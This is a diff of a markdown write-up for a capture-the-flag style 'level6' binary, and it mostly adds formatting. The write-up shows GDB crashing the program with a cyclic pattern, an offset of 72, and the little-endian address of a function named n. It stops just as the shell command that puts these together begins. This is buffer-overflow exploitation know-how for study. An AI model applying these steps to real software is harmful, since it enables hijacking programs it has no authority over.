@@ -2,6 +2,7 @@ We start by opening the binary in [dogbolt](https://dogbolt.org/) here we see th
 
 We search the offset using a pattern generator like : [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator)
 
+In GDB :
 ```
 r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 The program being debugged has been started already.
@@ -13,7 +14,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x41346341 in ?? ()
 ```
 
-When we put 0x41346341 in wiremask it find an offset of 72.
+When we put `0x41346341` in `wiremask` it find an offset of 72.
 
 We search `n`:
 
@@ -26,8 +27,8 @@ objdump -t level6
 ...
 ```
 
-address of `n` : 08048454
-little-endian : /x54/x84/x04/x08
+address of `n` : `08048454`
+little-endian : `/x54/x84/x04/x08`
 
 Putting this together give us :
 ```Shell
